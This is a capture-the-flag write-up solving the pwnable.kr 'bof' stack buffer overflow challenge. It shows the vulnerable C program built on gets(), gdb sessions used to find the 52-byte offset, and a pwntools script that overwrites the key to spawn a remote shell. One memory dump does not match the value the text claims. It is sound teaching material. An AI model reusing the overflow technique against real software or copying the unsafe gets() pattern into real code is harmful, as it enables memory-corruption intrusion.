# Source Code
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

# Solution
- As usual, the first step is always try to understand the code and test out the program
```bash
file bof
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```

- Since the program is 32-bit executable file, we will need to install **`lib32-glibc`** as it allows gcc to compile source code into 32-bit executable file and allow 32-bit executable file to run on terminal.

```bash
./bof
overflow me:
test
Nah..
```

- After testing out the program and reading the source code, we will need to spawn a shell based on the given program.
- It is basically impossible as the **`0xdeadbeef`** is set as ***`key`** but **`key`** must be **`0xcafebabe`** to spawn the shell.
- Thanks to **`gets()`** function, we are able to change the **`key`** by using buffer overflow attack, which is a attack that give a large amount of input and try to change the value of **`key`**
- We will need to right amount of input in order to perform buffer overflow correctly. To do so, we will get some help from **`gdb`**

- By using **`gdb`**, we are able to read both the **`main()`** and **`func()`** function in assembly language which is actually same with the source code.
- Set a breakpoint at **`main()`** and **`**func()**`** and start running the program
- use **`ni`** to continue the program to the next step and use **`si`** when it reach below step to move inside **`func()`**
- **`→ 0x5655569a <main+16>        call   0x5655562c <func>`**
- continue **`ni`** until **`→ 0x5655564f <func+35>        call   0xf7c726c0 <gets>`**

```bash
gef➤  b main   <---- break main
gef➤  b func   <---- break func
gef➤  r        <---- run
gef➤  ni       <---- step one instruction but proceed through subroutine calls
gef➤  ni       <---- step one instruction but proceed through subroutine calls
gef➤  ni       <---- step one instruction but proceed through subroutine calls
gef➤  si       <---- step one instruction exactly (to go into func)
```

- the instruction is trying to run **`gets()`** function which means that we will need to give our input once we proceed to next step. use **`ni`** to proceed next step.
- Input anything into the function and observe the result

```bash
gef➤  ni
AAAABBBBCCCCDDDDEEEE
```

- After insert the input, we will reach the below instruction
- **`→ 0x56555654 <func+40>        cmp    DWORD PTR [ebp+0x8], 0xcafebabe`**
- Based on this instruction, it is trying to compare **`$ebp+0x8`** with **`0xcafebabe`**
- From this, we could understand that we are currently at **`if(key == 0xcafebabe)`** if we refer to the source code

```bash
gef➤  x/wx $ebp+0x8
0xffffce90:     0xdeadbeef
```

- We will need to try to change **`$ebp+0x8`** to **`0xcafebabe`**
- To do so, we will have a look at our buffer overflow attack

```bash
gef➤  x/20x $eax
0xffffce5c:     0x41414141      0x42424242      0x43434343      0x44444444
0xffffce6c:     0x45454545      0x00000000      0x00000000      0x00000000
0xffffce7c:     0xda2d7300      0xffffffff      0xf7c082f4      0xffffcea8
0xffffce8c:     0x5655569f      0xdeadbeef      0x00000000      0x00000000
0xffffce9c:     0x00000000      0x00000000      0x00000000      0x00000000
```
- we have print out the value of **`$eax`** and the next 20 value of the memory address
- value of **`$eax`** is our input which is **`0x41414141`** = AAAA, **`0x45454545`** = EEEE
- by looking into the table, we will need to have the right amount to reach **`0xdeadbeef`**
- To reach **`0xdeadbeef`**, we need to have value of 13 cells which is from **`0x41414141`** to **`0x5655569f`**
- Since we need 4 character in a cell, we will need 52 character to reach **`0xdeadbeef`**
- Now lets try again and see if we are right

```bash

gef➤  x/20x $eax
0xffffce5c:     0x41414141      0x41414141      0x41414141      0x41414141

0xffffce7c:     0x41414141      0x41414141      0x41414141      0x41414141

0xffffce9c:     0x00000000      0x00000000      0x00000000      0x00000000
```

- We manage to change the value of **`0xdeadbeef`** to **`0x42424242`**
- Now we have a right amount of value which is 52 and we will to add **`0xcafebabe`** to spawn a shell.
- we will use python and pwntools to complete the challenge


## Solution.py

```python
from pwn import *

buffer = b'A'*52
payload = buffer + p32(0xcafebabe)

p = remote("pwnable.kr",9000)
p.sendline(payload)
p.interactive()
```
